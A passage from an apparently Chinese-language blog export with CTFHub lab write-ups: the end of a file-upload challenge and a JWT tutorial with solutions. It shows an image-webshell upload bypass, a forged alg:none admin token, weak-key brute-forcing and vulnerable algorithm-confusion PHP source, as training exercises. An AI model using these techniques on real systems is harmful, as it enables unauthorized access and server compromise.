src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908010.png"></p><h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>这里用jpg图片做示范，制作图片马，绕过文件头检查。</p><p>使用cmd命令：</p><p>在同时有图片和一句话木马的文件夹下打开cmd，然后使用以下命令。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 图片名 /b + 一句话木马的文件名 /a webshell.jpg<br></code></pre></td></tr></table></figure><p>意思是将一句话木马文件中的代码追加到图片中并重新生成一个叫webshell.php的代码。</p><p>比如作者图片名就叫“重庆森林不在重庆.jpg”，一句话木马的文件名还是“webshell.php”。</p><p>那么作者的命令为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 重庆森林不在重庆.jpg /b + webshell.php /a webshell.jpg<br></code></pre></td></tr></table></figure><p>下图表示图片马制作成功。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908444.png"></p><p>但是有的图片制作后依然不能上传，这时候就需要大家换图片、换图片类型（比如png）或者手动修改文件头</p><p>制作以后我们开始利用，上传图片马，然后抓包</p><p>将filename的后缀改为php（因为我们需要用jpg或者png格式的文件头及MIME绕过，但jpg或者png格式无法执行里面的一句话木马，所以我们上传还是要保存为php格式）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021908804.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021909977.png"></p><p>连接成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021909717.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021909282.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSON Web Token-CTFHub</title>
    <link href="/2025/05/04/JSONWebToken-CTFHub/"/>
    <url>/2025/05/04/JSONWebToken-CTFHub/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145458812?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145458812?spm=1001.2014.3001.5501</a></p></blockquote><p>在众多的CTF平台当中，CTFHub对于初学者来说，是入门平台的不二之选。CTFHub通过自己独特的技能树模块，可以帮助初学者来快速入门。具体请看官方介绍：<a href="https://www.ctfhub.com/#/index" title="CTFHub">CTFHub</a>。</p><p><strong>作者的CTFHub技能树汇总：</strong></p><p><a href="https://blog.csdn.net/2302_81178149/article/details/142747270?spm=1001.2014.3001.5501" title="CTFHub技能树Web汇总-CSDN博客">CTFHub技能树Web汇总-CSDN博客</a></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>看完文章，在最底下就有flag。</p><p>这篇文章写的不错，不过这里我还是总结一下</p><h3 id="一、JWT-基本概念"><a href="#一、JWT-基本概念" class="headerlink" title="一、JWT 基本概念"></a>一、JWT 基本概念</h3><p>JWT（JSON Web Token）是一种开放标准（RFC 7519），用于在各方之间安全地传输信息。JWT以JSON对象的形式存在，通过数字签名保证信息可以被验证和信任。JWT可以使用HMAC算法的密钥或RSA&#x2F;ECDSA的公钥&#x2F;私钥对进行签名。</p><p>JWT的核心优势在于其无状态性，服务器不需要存储会话信息，这使其特别适合于分布式系统、微服务架构和跨域认证场景。</p><p><strong>顾名思义，JSON Web Token就是一种JSON格式的Web服务的身份验证令牌（token）。</strong></p><h3 id="二、跨域认证的问题"><a href="#二、跨域认证的问题" class="headerlink" title="二、跨域认证的问题"></a>二、跨域认证的问题</h3><p>上面我们提到了JWT的核心优势，为了更好的理解该核心优势，我们这里提一下跨域认证</p><p>互联网服务离不开用户认证。一般流程是下面这样。</p><blockquote><p>1、用户向服务器发送用户名和密码。</p><p>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p><p>3、服务器向用户返回一个 session_id，写入用户的 Cookie。</p><p>4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</p><p>5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</p></blockquote><p>这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。</p><p>举例来说，A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现？</p><p>一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。</p><p>另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。</p><h3 id="三、JWT-的原理"><a href="#三、JWT-的原理" class="headerlink" title="三、JWT 的原理"></a>三、JWT 的原理</h3><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>  <span class="hljs-string">&quot;姓名&quot;</span>: <span class="hljs-string">&quot;张三&quot;</span>,<br>  <span class="hljs-string">&quot;角色&quot;</span>: <span class="hljs-string">&quot;管理员&quot;</span>,<br>  <span class="hljs-string">&quot;到期时间&quot;</span>: <span class="hljs-string">&quot;2018年7月1日0点0分&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p><p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h3 id="四、JWT-的数据结构"><a href="#四、JWT-的数据结构" class="headerlink" title="四、JWT 的数据结构"></a>四、JWT 的数据结构</h3><p>实际的 JWT 大概就像下面这样。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505041041398.jpeg" alt="img"></p><p>它是一个很长的字符串，中间用点（<code>.</code>）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。</p><p>JWT 的三个部分依次如下。</p><blockquote><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul></blockquote><p>写成一行，就是下面的样子。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Header</span>.<span class="hljs-property">Payload</span>.<span class="hljs-property">Signature</span><br></code></pre></td></tr></table></figure></blockquote><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505041041776.jpeg" alt="img"></p><p>最后每个部分都会使用 base64URLEncode方式进行编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">base64url_encode</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-title function_ invoke__">strtr</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$data</span>), <span class="hljs-string">&#x27;+/&#x27;</span>, <span class="hljs-string">&#x27;-_&#x27;</span>), <span class="hljs-string">&#x27;=&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>下面依次介绍这三个部分以及base64URL。</p><h4 id="4-1Header"><a href="#4-1Header" class="headerlink" title="4.1Header"></a>4.1Header</h4><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>上面代码中，<code>alg</code>属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；<code>typ</code>属性表示这个令牌（token）的类型（type），JWT 令牌统一写为<code>JWT</code>。</p><p>最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。</p><h4 id="4-2-Payload"><a href="#4-2-Payload" class="headerlink" title="4.2 Payload"></a>4.2 Payload</h4><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p><blockquote><ul><li>iss (issuer)：签发人</li><li>exp (expiration time)：过期时间</li><li>sub (subject)：主题</li><li>aud (audience)：受众</li><li>nbf (Not Before)：生效时间</li><li>iat (Issued At)：签发时间</li><li>jti (JWT ID)：编号</li></ul></blockquote><p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&#123;<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1234567890&quot;</span>,<br>  <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John Doe&quot;</span>,<br>  <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p><p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p><h4 id="4-3-Signature"><a href="#4-3-Signature" class="headerlink" title="4.3 Signature"></a>4.3 Signature</h4><p>Signature 部分是对前两部分的签名，防止数据篡改。</p><p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">HMACSHA256</span>(<br>  <span class="hljs-title function_">base64UrlEncode</span>(header) + <span class="hljs-string">&quot;.&quot;</span> +<br>  <span class="hljs-title function_">base64UrlEncode</span>(payload),<br>  secret)<br></code></pre></td></tr></table></figure></blockquote><p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（<code>.</code>）分隔，就可以返回给用户。</p><h4 id="4-4-Base64URL"><a href="#4-4-Base64URL" class="headerlink" title="4.4 Base64URL"></a>4.4 Base64URL</h4><p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p><p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 api.example.com&#x2F;?token&#x3D;xxx）。Base64 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是 Base64URL 算法。</p><h3 id="五、JWT-的使用方式"><a href="#五、JWT-的使用方式" class="headerlink" title="五、JWT 的使用方式"></a>五、JWT 的使用方式</h3><p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p><p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息<code>Authorization</code>字段里面。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Authorization</span>: <span class="hljs-title class_">Bearer</span> &lt;token&gt;<br></code></pre></td></tr></table></figure></blockquote><p>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p><h3 id="六、JWT-的几个特点"><a href="#六、JWT-的几个特点" class="headerlink" title="六、JWT 的几个特点"></a>六、JWT 的几个特点</h3><p>（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</p><p>（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。</p><p>（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</p><p>（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</p><p>（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</p><p>（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</p><p><strong>参考资料：</strong></p><p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p><p><a href="https://blog.csdn.net/frank110503/article/details/146455829">https://blog.csdn.net/frank110503/article/details/146455829</a></p><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>JWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}。</p><p>是一个登录框，随便输入，登录</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917663.png"></p><p>在存储里看到token了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917618.png"></p><p>用base64解密一下，可以看到我们账号密码直接显示了，这就是敏感信息泄露</p><p>FLAG也直接显示了，注意要复制正确，别把FL处的“}“也复制了</p><p>（这个解法并不是很好，一会我们有别的方法）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917959.png"></p><p>注意：</p><p><strong>Header</strong> 和 <strong>Payload</strong> 串型化的算法是 <strong>Base64URL</strong>。</p><p>JWT 作为一个令牌（token），有些场合可能会放到 URL里（比如 <code>api.example.com/?token=xxx</code>）。<strong>Base64 有三个字符+、&#x2F;和&#x3D;，在 URL 里面有特殊含义，所以要被替换掉：&#x3D;被省略、+替换成-，&#x2F;替换成_ 。</strong></p><p>这里最好还是用专门的jwt解密网站：<a href="https://jwt.io/" title="JSON Web Tokens - jwt.io">JSON Web Tokens - jwt.io</a></p><p>看着会更清楚</p><p>还是尝试登录，输入两个admin，复制token</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917478.png"></p><p>用专门的网站解密</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917843.png"></p><p>这个看着就清爽很多</p><p>然后把flag拼接起来即可</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917927.png"></p><h2 id="无签名"><a href="#无签名" class="headerlink" title="无签名"></a>无签名</h2><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。</p><p>还是登录，然后拿到token解密</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021919551.png"></p><p>根据题目的提示</p><p>应该是将alg字段设置为none，这样后端将不执行签名验证。</p><p>同时我们将role改为admin试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917492.png"></p><p>注意去掉&#x3D;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917407.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VybmFtZSI<span class="hljs-number">6</span>ImFkbWluIiwicGFzc<span class="hljs-number">3</span>dvcmQiOiJhZG<span class="hljs-number">1</span>pbiIsInJvbGUiOiJhZG<span class="hljs-number">1</span>pbiJ<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>然后用.连接起来，再然后别忘了最后还得加个.用来连接签名（虽然签名为空）</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917124.png"></p><h2 id="弱密钥"><a href="#弱密钥" class="headerlink" title="弱密钥"></a>弱密钥</h2><p>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥。尝试获取flag</p><p>这里很明显是要我们去进行JWT的弱密钥爆破</p><p>这里作者用的是c-jwt-cracker</p><p><a href="https://github.com/brendan-rius/c-jwt-cracker" title="GitHub - brendan-rius&#x2F;c-jwt-cracker: JWT brute force cracker written in C">GitHub - brendan-rius&#x2F;c-jwt-cracker: JWT brute force cracker written in C</a></p><p>由于在kali上一直配不好，遂在docker里使用。</p><p>先从上面链接里下载zip文件，然后解压缩，放入kali中（作者的kali里已经安装docker了，没有安装的可以去找个教程），然后在该文件夹里打开终端（这里作者给文件夹改了个名），按照github里的指令执行：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917204.png"></p><p>具体的命令github里面都有，直接复制即可，只需要构建镜像、运行这两步（如下）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021917586.png"></p><p>安装完成后，我们运行一下，把CTFHub上的JWT复制一下，替换github上给的实例，进行爆破</p><p>出结果了，作者的密钥是qrni</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918920.png"></p><p>然后我们输入密钥，在线网站会显示签名已验证</p><p>然后我们把role改为admin</p><p>复制JWT</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918932.png"></p><p>将role是admin的JWT写入cookie，然后刷新</p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918334.png"></p><h2 id="修改签名算法"><a href="#修改签名算法" class="headerlink" title="修改签名算法"></a>修改签名算法</h2><p>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p><p>是一个登录框及源码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918888.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span> <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/vendor/autoload.php&#x27;</span>;<br><span class="hljs-keyword">use</span> \<span class="hljs-title">Firebase</span>\<span class="hljs-title">JWT</span>\<span class="hljs-title">JWT</span>;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JWTHelper</span> </span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>), <span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$alg</span>=<span class="hljs-string">&#x27;HS256&#x27;</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> JWT::<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$alg</span>);<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$token</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$alg</span>=<span class="hljs-string">&#x27;HS256&#x27;</span></span>) </span>&#123;<br>    <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-title class_">JWTHelper</span>::<span class="hljs-title function_ invoke__">getHeader</span>(<span class="hljs-variable">$token</span>);<br>            <span class="hljs-variable">$algs</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$header</span>-&gt;alg, <span class="hljs-variable">$alg</span>));<br>      <span class="hljs-keyword">return</span> JWT::<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-variable">$token</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$algs</span>);<br>    &#125; <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getHeader</span>(<span class="hljs-params"><span class="hljs-variable">$jwt</span></span>) </span>&#123;<br>        <span class="hljs-variable">$tks</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$jwt</span>);<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$headb64</span>, <span class="hljs-variable">$bodyb64</span>, <span class="hljs-variable">$cryptob64</span>) = <span class="hljs-variable">$tks</span>;<br>        <span class="hljs-variable">$header</span> = JWT::<span class="hljs-title function_ invoke__">jsonDecode</span>(JWT::<span class="hljs-title function_ invoke__">urlsafeB64Decode</span>(<span class="hljs-variable">$headb64</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$header</span>;<br>    &#125;<br>&#125;<br> <br><span class="hljs-variable">$FLAG</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;FLAG&quot;</span>);<br><span class="hljs-variable">$PRIVATE_KEY</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/privatekey.pem&quot;</span>);<br><span class="hljs-variable">$PUBLIC_KEY</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;./publickey.pem&quot;</span>);<br> <br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$token</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] === <span class="hljs-variable">$FLAG</span>)&#123;<br>            <span class="hljs-variable">$jwt_payload</span> = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<br>                <span class="hljs-string">&#x27;role&#x27;</span>=&gt; <span class="hljs-string">&#x27;admin&#x27;</span>,<br>            );<br>            <span class="hljs-variable">$token</span> = <span class="hljs-title class_">JWTHelper</span>::<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$jwt_payload</span>, <span class="hljs-variable">$PRIVATE_KEY</span>, <span class="hljs-string">&#x27;RS256&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$jwt_payload</span> = <span class="hljs-keyword">array</span>(<br>                <span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>],<br>                <span class="hljs-string">&#x27;role&#x27;</span>=&gt; <span class="hljs-string">&#x27;guest&#x27;</span>,<br>            );<br>            <span class="hljs-variable">$token</span> = <span class="hljs-title class_">JWTHelper</span>::<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$jwt_payload</span>, <span class="hljs-variable">$PRIVATE_KEY</span>, <span class="hljs-string">&#x27;RS256&#x27;</span>);<br>        &#125;<br>        @<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-variable">$token</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">1800</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /index.php&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: /index.php&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]) &amp;&amp; <span class="hljs-title class_">JWTHelper</span>::<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>], <span class="hljs-variable">$PUBLIC_KEY</span>) != <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title class_">JWTHelper</span>::<span class="hljs-title function_ invoke__">decode</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>], <span class="hljs-variable">$PUBLIC_KEY</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$obj</span>-&gt;role === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里输入admin及admin，登录</p><p>打印出了我们的JWT</p><p><img 